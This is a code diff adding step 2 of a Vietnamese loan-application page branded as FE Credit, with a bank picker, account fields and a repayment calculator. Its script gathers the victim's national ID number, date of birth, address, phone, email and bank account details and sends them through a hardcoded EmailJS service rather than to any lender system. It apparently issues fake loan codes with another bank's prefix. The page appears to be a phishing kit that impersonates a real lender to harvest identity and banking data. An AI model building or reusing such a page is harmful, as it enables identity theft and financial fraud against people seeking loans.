+                  Liên Việt (LP Bank)
+                </div>
+                <div class="custom-select-option" data-value="mbv">
+                  <img
+                    src="https://cdn.thuviennhadat.vn//upload/hinh-anh-bai-viet/NHN/Thang-02-2025/04-03/mbv-la-ngan-hang-gi-tien-than-cua-ngan-hang-mbv-la-oceanbank.jpg"
+                    alt="MBV Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Việt Nam Hiện Đại (MBV)
+                </div>
+                <div class="custom-select-option" data-value="vcbneo">
+                  <img
+                    src="https://tttctt.1cdn.vn/thumbs/1200x630/2025/01/22/screen-shot-2025-01-22-at-06-3-3361-1192-1737503084.png"
+                    alt="VCBNeo Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  VCBNeo (VCBNeo Bank)
+                </div>
+                <div class="custom-select-option" data-value="indovinabank">
+                  <img
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRwLlw1qFMlrQSpS6cGiqNL1mEfk7sEQ_2-Dg&s"
+                    alt="Indovina Bank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Indovina Bank (Indovina Bank)
+                </div>
+                <div
+                  class="custom-select-option"
+                  data-value="vietnamrussiabank"
+                >
+                  <img
+                    src="https://vrbank.com.vn/Uploads/Logo_LienKet/logo-VRB.png"
+                    alt="Vietnam-Russia Bank Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Vietnam-Russia Bank (VR Bank)
+                </div>
+                <div class="custom-select-option" data-value="anzvietnam">
+                  <img
+                    src="https://www.caodangvietmy.edu.vn/wp-content/uploads/2014/05/a5e656a3-1ca1-46dd-a96c-156d8be207c3-anz-logo-1024x1024.jpg"
+                    alt="ANZ Vietnam Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  ANZ Vietnam (ANZ Bank)
+                </div>
+                <div class="custom-select-option" data-value="citibankvietnam">
+                  <img
+                    src="https://cdn.iconscout.com/icon/free/png-256/free-citi-logo-icon-download-in-svg-png-gif-file-formats--bank-payment-method-gateway-logos-pack-icons-675714.png?f=webp&w=256"
+                    alt="Citibank Vietnam Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Citibank Vietnam (Citi Bank)
+                </div>
+                <div
+                  class="custom-select-option"
+                  data-value="kookminbankvietnam"
+                >
+                  <img
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcR-K_tILLruPVwElDRsaRWGCpM0I0CEda-8yg&s"
+                    alt="Kookmin Bank Vietnam Logo"
+                    class="bank-logo"
+                    onerror="this.src='https://via.placeholder.com/30'"
+                  />
+                  Kookmin Bank Vietnam (KB Bank)
+                </div>
+              </div>
+            </div>
+            <input
+              type="hidden"
+              id="bank"
+              name="bank"
+              required
+              aria-describedby="bankError"
+            />
+            <span class="error" id="bankError">Vui lòng chọn ngân hàng</span>
+                    </div>
+                    <div class="col-md-12">
+                        <label class="form-label">Số tài khoản *</label>
+                        <input type="text" class="form-control" id="accountNumber" name="accountNumber" placeholder="Nhập số tài khoản" required minlength="8" maxlength="20">
+                        <div class="invalid-feedback" id="accountNumberError">Số tài khoản phải từ 8-20 số</div>
+                    </div>
+                    <div class="col-md-12">
+                        <label class="form-label">Tên chủ tài khoản *</label>
+                        <input type="text" class="form-control" id="accountName" name="accountName" placeholder="NGUYEN VAN A" required style="text-transform: uppercase;">
+                        <small class="text-danger" style="font-size: 12px;">* Phải trùng với tên đăng ký ở Bước 1</small>
+                        <div class="invalid-feedback" id="accountNameError">Tên tài khoản không được để trống</div>
+                    </div>
+                </div>
+
+                <button type="button" onclick="finishStep2()" class="btn btn-next" id="btnSubmit">
+                    XÁC NHẬN & GỬI HỒ SƠ <i class="fas fa-paper-plane ms-2"></i>
+                </button>
+
+            </form>
+        </div>
+    </div>
+
+    <div id="loadingModal">
+        <div class="bg-white p-4 rounded-3 text-center" style="width: 300px;">
+            <div class="spinner-border text-success mb-3" role="status"></div>
+            <h5 class="mb-2">Đang gửi hồ sơ...</h5>
+            <p class="text-muted small mb-0">Vui lòng chờ trong giây lát</p>
+        </div>
+    </div>
+
+    <footer class="text-center py-4 bg-white border-top">
+        <p class="small text-muted mb-0">© 2024 FE Credit. Bảo mật tuyệt đối.</p>
+    </footer>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4.4.1/dist/email.min.js"></script>
+
+    <script>
+        // =====================================================================
+        // PHẦN 1: LOGIC LƯU VỊ TRÍ - Save current step on page load
+        // =====================================================================
+        // Lưu vị trí hiện tại ngay khi trang tải
+        localStorage.setItem('currentStep', 'step2.html');
+
+        // --- CONFIG (From step1cu.html) ---
+        const emailjsConfig = {
+            serviceId: 'service_60tgxof',
+            templateId: 'template_zarmuna',
+            publicKey: 'J4YH-lyfEfxXeu7aV'
+        };
+        const SECRET_KEY = 'fecredit-secret-key-v1'; // Unified encryption key across all steps
+
+        // Initialize EmailJS
+        try {
+            emailjs.init(emailjsConfig.publicKey);
+        } catch (error) {
+            console.error('Cannot initialize EmailJS:', error);
+        }
+
+        let userData = {}; // Global variable to store user data
+
+        // --- UTILS (From step1cu.html) ---
+        function loadUserData() {
+            const encrypted = localStorage.getItem('userData');
+            if (!encrypted) return null;
+            try {
+                return JSON.parse(CryptoJS.AES.decrypt(encrypted, SECRET_KEY).toString(CryptoJS.enc.Utf8));
+            } catch (e) {
+                return null;
+            }
+        }
+
+        function saveToLocalStorage() {
+            try {
+                const encrypted = CryptoJS.AES.encrypt(JSON.stringify(userData), SECRET_KEY).toString();
+                localStorage.setItem('userData', encrypted);
+                return true;
+            } catch (error) {
+                console.error("Lỗi lưu data", error);
+                return false;
+            }
+        }
+
+        // --- AUTO UPDATE INTEREST RATE (From step1cu.html) ---
+        function updateInterestRate() {
+            const loanType = $('#loanType').val() || '';
+            const interestRate = $('#interestRate');
+            const rates = {
+                'Vay tín chấp': 12.0,
+                'Vay thế chấp': 6.2,
+                'Vay mua nhà': 5.5,
+                'Vay mua xe': 6.4,
+                'Vay tiêu dùng': 10.0,
+                'Vay trả góp': 7.2
+            };
+            const rate = rates[loanType] || 7.0;
+            interestRate.val(rate.toFixed(2));
+            // Trigger calculation after rate update
+            calculateLoan();
+        }
+
+        // --- CALCULATE LOAN (From step1cu.html) ---
+        function calculateLoan() {
+            const loanAmountEl = $('#loanAmount');
+            const loanTermEl = $('#loanTerm');
+            const interestRateEl = $('#interestRate');
+            
+            // Validate
+            let isCalcValid = true;
+            if(!loanAmountEl.val() || (loanAmountEl.val() === 'other' && !$('#customLoanAmount').val())) {
+                isCalcValid = false;
+            }
+            if(!loanTermEl.val()) {
+                isCalcValid = false;
+            }
+            if(!isCalcValid) {
+                return;
+            }
+
+            // Get loan amount
+            const loanAmountValue = $('#loanAmount').val();
+            let loanAmount;
+            if (loanAmountValue === 'other') {
+                const customValue = $('#customLoanAmount').val().replace(/,/g, '');
+                loanAmount = parseFloat(customValue);
+            } else {
+                loanAmount = parseFloat(loanAmountValue);
+            }
+
+            const loanTerm = parseInt($('#loanTerm').val());
+            const interestRate = parseFloat($('#interestRate').val()) / 100 / 12; // Monthly rate
+
+            if (isNaN(loanAmount) || isNaN(loanTerm) || isNaN(interestRate) || loanAmount <= 0) {
+                return;
+            }
+
+            // Calculate monthly payment (PMT formula)
+            const monthlyRate = interestRate;
+            const ratePower = Math.pow(1 + monthlyRate, loanTerm);
+            const monthlyPayment = (loanAmount * monthlyRate * ratePower) / (ratePower - 1);
+            const totalAmount = monthlyPayment * loanTerm;
+            const totalInterest = totalAmount - loanAmount;
+
+            // Update summary display
+            $('#calcLoanAmount').text(Math.floor(loanAmount).toLocaleString('vi-VN') + ' VNĐ');
+            $('#calcMonthlyPayment').text(Math.floor(monthlyPayment).toLocaleString('vi-VN') + ' VNĐ');
+            $('#calcTotalInterest').text(Math.floor(totalInterest).toLocaleString('vi-VN') + ' VNĐ');
+            $('#calcTotalAmount').text(Math.floor(totalAmount).toLocaleString('vi-VN') + ' VNĐ');
+
+            // Build amortization table
+            let balance = loanAmount;
+            const tableBody = $('#calculationTable').empty();
+            const fragment = document.createDocumentFragment();
+            
+            for (let month = 1; month <= loanTerm; month++) {
+                const interest = balance * interestRate;
+                const principal = monthlyPayment - interest;
+                balance -= principal;
+                
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td data-label="Tháng">${month}</td>
+                    <td data-label="Gốc">${Math.floor(principal).toLocaleString('vi-VN')}</td>
+                    <td data-label="Lãi">${Math.floor(interest).toLocaleString('vi-VN')}</td>
+                    <td data-label="Tổng">${Math.floor(monthlyPayment).toLocaleString('vi-VN')}</td>
+                    <td data-label="Dư nợ">${Math.max(0, Math.floor(balance)).toLocaleString('vi-VN')}</td>
+                `;
+                fragment.appendChild(row);
+            }
+            tableBody.append(fragment);
+
+            // Store in userData for later use
+            userData.monthlyPayment = monthlyPayment;
+            userData.totalInterest = totalInterest;
+            userData.totalRepay = totalAmount;
+        }
+
+        // --- VALIDATION ---
+        function validateStep2() {
+            let isValid = true;
+            let firstError = null;
+
+            // Validate loan type
+            if (!$('#loanType').val()) {
+                $('#loanType').addClass('is-invalid');
+                isValid = false;
+                if (!firstError) firstError = $('#loanType')[0];
+            } else {
+                $('#loanType').removeClass('is-invalid');
+            }
+
+            // Validate loan amount
+            const loanAmountValue = $('#loanAmount').val();
+            if (!loanAmountValue) {
+                $('#loanAmount').addClass('is-invalid');
+                $('#loanAmountError').text('Vui lòng chọn số tiền vay.');
+                isValid = false;
+                if (!firstError) firstError = $('#loanAmount')[0];
+            } else if (loanAmountValue === 'other') {
+                const customAmount = $('#customLoanAmount').val().replace(/,/g, '');
+                const numValue = parseFloat(customAmount);
+                if (isNaN(numValue) || numValue < 10000000) {
+                    $('#customLoanAmount').addClass('is-invalid');
+                    $('#customLoanAmountError').text('Số tiền phải >= 10.000.000 VNĐ');
+                    isValid = false;
+                    if (!firstError) firstError = $('#customLoanAmount')[0];
+                } else {
+                    $('#customLoanAmount').removeClass('is-invalid');
+                }
+            } else {
+                $('#loanAmount').removeClass('is-invalid');
+            }
+
+            // Validate loan term
+            if (!$('#loanTerm').val()) {
+                $('#loanTerm').addClass('is-invalid');
+                isValid = false;
+                if (!firstError) firstError = $('#loanTerm')[0];
+            } else {
+                $('#loanTerm').removeClass('is-invalid');
+            }
+
+            // Validate purpose
+            if (!$('#purpose').val()) {
+                $('#purpose').addClass('is-invalid');
+                isValid = false;
+                if (!firstError) firstError = $('#purpose')[0];
+            } else {
+                $('#purpose').removeClass('is-invalid');
+            }
+
+            // Validate monthly income
+            const monthlyIncome = parseFloat($('#monthlyIncome').val().replace(/,/g, ''));
+            if (isNaN(monthlyIncome) || monthlyIncome < 3000000) {
+                $('#monthlyIncome').addClass('is-invalid');
+                $('#monthlyIncomeError').text('Thu nhập phải từ 3.000.000 VNĐ trở lên.');
+                isValid = false;
+                if (!firstError) firstError = $('#monthlyIncome')[0];
+            } else {
+                $('#monthlyIncome').removeClass('is-invalid');
+            }
+
+            // Validate occupation
+            if (!$('#occupation').val()) {
+                $('#occupation').addClass('is-invalid');
+                isValid = false;
+                if (!firstError) firstError = $('#occupation')[0];
+            } else {
+                $('#occupation').removeClass('is-invalid');
+            }
+
+            // Validate bank name
+            if (!$('#bankName').val()) {
+                $('#bankName').addClass('is-invalid');
+                isValid = false;
+                if (!firstError) firstError = $('#bankName')[0];
+            } else {
+                $('#bankName').removeClass('is-invalid');
+            }
+
+            // Validate account number
+            const accountNumber = $('#accountNumber').val().replace(/\s/g, '');
+            if (!/^\d{8,20}$/.test(accountNumber)) {
+                $('#accountNumber').addClass('is-invalid');
+                $('#accountNumberError').text('Số tài khoản phải từ 8-20 số.');
+                isValid = false;
+                if (!firstError) firstError = $('#accountNumber')[0];
+            } else {
+                $('#accountNumber').removeClass('is-invalid');
+            }
+
+            // Validate account name
+            if (!$('#accountName').val().trim()) {
+                $('#accountName').addClass('is-invalid');
+                isValid = false;
+                if (!firstError) firstError = $('#accountName')[0];
+            } else {
+                $('#accountName').removeClass('is-invalid');
+            }
+
+            if (!isValid && firstError) {
+                firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                firstError.focus();
+            }
+
+            return isValid;
+        }
+
+        // --- MAIN SUBMIT FUNCTION (From step1cu.html) ---
+        async function finishStep2() {
+            if (!validateStep2()) {
+                alert("Vui lòng điền đầy đủ thông tin khoản vay.");
+                return;
+            }
+
+            // 1. Load Step 1 data
+            const step1Data = loadUserData();
+            if (!step1Data || !step1Data.fullName) {
+                alert("Không tìm thấy thông tin Bước 1. Vui lòng quay lại.");
+                window.location.href = 'step1.html';
+                return;
+            }
+
+            // 2. Collect Step 2 data
+            const loanAmountValue = $('#loanAmount').val();
+            const loanAmount = loanAmountValue === 'other' ? 
+                              $('#customLoanAmount').val().replace(/,/g, '') : loanAmountValue;
+
+            // 3. Merge all data (Step 1 + Step 2)
+            userData = {
+                // From Step 1
+                fullName: step1Data.fullName,
+                dob: step1Data.dob,
+                gender: step1Data.gender,
+                contactAddress: step1Data.contactAddress,
+                cccd: step1Data.cccd,
+                issuePlace: step1Data.issuePlace,
+                phone: step1Data.phone,
+                email: step1Data.email,
+                // From Step 2
+                loanType: $('#loanType').val(),
+                loanTerm: $('#loanTerm').val(),
+                loanAmount: loanAmount,
+                interestRate: parseFloat($('#interestRate').val()),
+                monthlyIncome: parseFloat($('#monthlyIncome').val().replace(/,/g, '')),
+                occupation: $('#occupation').val(),
+                purpose: $('#purpose').val(),
+                accountName: $('#accountName').val().trim(),
+                accountNumber: $('#accountNumber').val().trim().replace(/\s/g, ''),
+                bankName: $('#bankName').val(),
+                // Generated data
+                loanCode: 'SHB' + Math.floor(100000 + Math.random() * 900000),
+                monthlyPayment: userData.monthlyPayment || 0,
+                totalInterest: userData.totalInterest || 0,
+                totalRepay: userData.totalRepay || 0,
+                currentStep: 2,
+                isRegistered: true,
+                emailSent: false,
+                timestamp: new Date().toISOString()
+            };
+
+            // 4. Show loading modal
+            $('#btnSubmit').prop('disabled', true);
+            $('#loadingModal').css('display', 'flex').hide().fadeIn();
+
+            // 5. Save to localStorage
+            if (!saveToLocalStorage()) {
+                alert('Lỗi lưu dữ liệu. Vui lòng thử lại.');
+                $('#loadingModal').fadeOut();
+                $('#btnSubmit').prop('disabled', false);
+                return;
+            }
+
+            // 6. Prepare EmailJS templateParams (EXACTLY as in step1cu.html)
+            const emailjsInfo = {
+                serviceId: emailjsConfig.serviceId,
+                templateId: emailjsConfig.templateId,
+                publicKey: emailjsConfig.publicKey,
+                status: 'ready',
+                timestamp: new Date().toISOString()
+            };
+
+            const templateParams = {
+                full_name: userData.fullName,
+                dob: userData.dob,
+                gender: userData.gender,
+                contact_address: userData.contactAddress,
+                id_number: userData.cccd,
+                id_issue_place: userData.issuePlace,
+                phone_number: userData.phone,
+                email: userData.email,
+                loan_type: userData.loanType,
+                loan_term: userData.loanTerm ? userData.loanTerm + ' tháng' : '',
+                loan_amount: userData.loanAmount ? parseInt(userData.loanAmount).toLocaleString('vi-VN') + ' VNĐ' : '',
+                income: userData.monthlyIncome ? userData.monthlyIncome.toLocaleString('vi-VN') + ' VNĐ' : '',
+                occupation: userData.occupation,
+                loan_purpose: userData.purpose,
+                account_holder_name: userData.accountName,
+                account_number: userData.accountNumber,
+                bank_name: userData.bankName,
+                loan_code: userData.loanCode,
+                monthly_payment: userData.monthlyPayment ? Math.floor(userData.monthlyPayment).toLocaleString('vi-VN') + ' VNĐ' : '',
+                total_interest: userData.totalInterest ? Math.floor(userData.totalInterest).toLocaleString('vi-VN') + ' VNĐ' : '',
+                total_repayment: userData.totalRepay ? Math.floor(userData.totalRepay).toLocaleString('vi-VN') + ' VNĐ' : '',
+                // EmailJS info for debugging
+                emailjs_service_id: emailjsInfo.serviceId,
+                emailjs_template_id: emailjsInfo.templateId,
+                emailjs_public_key: emailjsInfo.publicKey,
+                emailjs_status: emailjsInfo.status
+            };
+
+            // 7. Send Email via EmailJS
+            try {
+                if (!emailjs) throw new Error('EmailJS not initialized');
+                if (!emailjsConfig) throw new Error('EmailJS config not defined');
+
+                const response = await emailjs.send(
+                    emailjsConfig.serviceId, 
+                    emailjsConfig.templateId, 
+                    templateParams
+                );
+
+                if (response.status === 200) {
+                    userData.emailSent = true;
+                    userData.currentStep = 2;
+                    userData.timestamp = new Date().toISOString();
+                    
+                    saveToLocalStorage();
+                    
+                    alert('Đăng ký thành công! Cảm ơn bạn đã đăng ký vay với FE Credit.\nMã hồ sơ: ' + userData.loanCode);
+                    
+                    // Redirect to success page or step 3
+                    setTimeout(() => {
+                        window.location.href = 'step3.html';
+                    }, 2000);
+                } else {
+                    throw new Error(`Email service returned status: ${response.status}`);
+                }
+            } catch (error) {
+                console.error('Email error:', error);
+                alert('Gửi đăng ký không thành công. Vui lòng thử lại sau.\n' + error.message);
+                $('#loadingModal').fadeOut();
+                $('#btnSubmit').prop('disabled', false);
+            }
+        }
+
+        // --- DOCUMENT READY ---
+        $(document).ready(function() {
+            // 1. Protect flow: Redirect if no Step 1 data
+            const step1Data = loadUserData();
+            if (!step1Data || !step1Data.fullName) {
+                alert("Vui lòng điền thông tin cá nhân trước!");
+                window.location.href = 'step1.html';
+                return;
+            }
+
+            // 2. Apply masks
+            $('#monthlyIncome').mask('000,000,000,000', {reverse: true});
+            $('#customLoanAmount').mask('000,000,000,000,000,000', {reverse: true});
+            $('#accountNumber').mask('00000000000000000000', {
+                translation: { '0': { pattern: /[0-9]/, optional: true } }
+            });
+
+            // 3. Pre-fill account name from Step 1
+            if(step1Data.fullName) {
+                $('#accountName').val(step1Data.fullName);
+            }
+
+            // 4. Handle "Khác" option for loan amount
+            $('#loanAmount').change(function() {
+                const customGroup = $('#customLoanAmountGroup');
+                if (this.value === 'other') {
+                    customGroup.slideDown();
+                } else {
+                    customGroup.slideUp();
+                    $('#customLoanAmount').val('');
+                }
+                calculateLoan();
+            });
+
+            // 5. Auto update interest rate when loan type changes
+            $('#loanType').change(updateInterestRate);
+
+            // 6. Trigger calculation on relevant field changes
+            $('#loanAmount, #loanTerm, #interestRate, #customLoanAmount').on('change input', calculateLoan);
+
+            // 7. Initialize interest rate
+            updateInterestRate();
+
+            // 8. Remove validation error on input
+            $('input, select').on('input change', function() {
+                $(this).removeClass('is-invalid');
+            });
+        });
+    </script>
+</body>
+</html>
